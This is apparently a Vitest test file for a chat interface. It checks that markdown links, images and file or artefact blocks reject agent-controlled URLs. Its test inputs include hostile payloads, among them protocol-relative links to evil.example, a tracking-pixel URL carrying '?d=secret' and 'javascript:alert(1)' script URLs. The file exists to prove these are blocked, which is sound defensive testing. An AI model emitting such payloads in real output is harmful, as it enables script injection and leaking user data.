// SEC-23: agent-controlled URLs in chat output.
import React from 'react';
import { afterEach, describe, expect, it } from 'vitest';
import { cleanup, render } from '@testing-library/react';
import { markdown, FileBlock, ArtefactBlock } from '../components/turns.jsx';

afterEach(cleanup);

function dom(html) {
  const d = document.createElement('div');
  d.innerHTML = html;
  return d;
}

describe('markdown URL safety', () => {
  it('refuses protocol-relative links', () => {
    const d = dom(markdown('[x](//evil.example/a) [y](/\\\\evil.example/b)'));
    for (const a of d.querySelectorAll('a')) {
      expect(a.getAttribute('href')).not.toMatch(/^\/[\\/]/);
    }
  });

  it('keeps https, root-relative and fragment links, with noopener noreferrer', () => {
    const d = dom(markdown('[a](https://docs.rs/x) [b](/#/artefacts/a1) [c](#top)'));
    const links = [...d.querySelectorAll('a')];
    expect(links.map(a => a.getAttribute('href'))).toEqual(['https://docs.rs/x', '/#/artefacts/a1', '#top']);
    for (const a of links) expect(a.getAttribute('rel')).toBe('noopener noreferrer');
  });

  it('does not load remote images', () => {
    const d = dom(markdown('![pixel](https://tracker.example/p.gif?d=secret) ![ok](/api/conversations/c1/files/f1)'));
    const imgs = [...d.querySelectorAll('img')];
    expect(imgs.map(i => i.getAttribute('src'))).toEqual(['/api/conversations/c1/files/f1']);
    expect(d.textContent).toContain('pixel');
  });
});

describe('FileBlock / ArtefactBlock URL validation', () => {
  it('drops a script URL on a file block', () => {
    const { container } = render(
      <FileBlock block={{ type: 'file', name: 'x.txt', mime: 'text/plain', url: 'javascript:alert(1)' }}/>,
    );
    for (const a of container.querySelectorAll('a')) {
      expect(a.getAttribute('href') || '').not.toMatch(/^javascript:/i);
    }
  });

  it('drops a remote image URL on a file block', () => {
    const { container } = render(
      <FileBlock block={{ type: 'file', name: 'x.png', mime: 'image/png', url: '//evil.example/x.png' }}/>,
    );
    expect(container.querySelector('img')).toBeNull();
  });

  it('keeps same-origin and blob URLs', () => {
    const { container } = render(
      <FileBlock block={{ type: 'file', name: 'x.png', mime: 'image/png', url: '/api/conversations/c1/files/f1' }}/>,
    );
    expect(container.querySelector('img').getAttribute('src')).toBe('/api/conversations/c1/files/f1');
    const blob = render(
      <FileBlock block={{ type: 'file', name: 'y.png', mime: 'image/png', url: 'blob:http://localhost/abc', local: true }}/>,
    );
    expect(blob.container.querySelector('img').getAttribute('src')).toBe('blob:http://localhost/abc');
  });

  it('ignores an artefact deep-link that is not same-origin', () => {
    const { container } = render(
      <ArtefactBlock block={{ type: 'artefact', id: 'a1', kind: 'report', title: 'r', url: 'javascript:alert(1)' }} chatId="c1"/>,
    );
    const href = container.querySelector('a').getAttribute('href');
    expect(href).toBe('/#/artefacts/a1');
  });
});
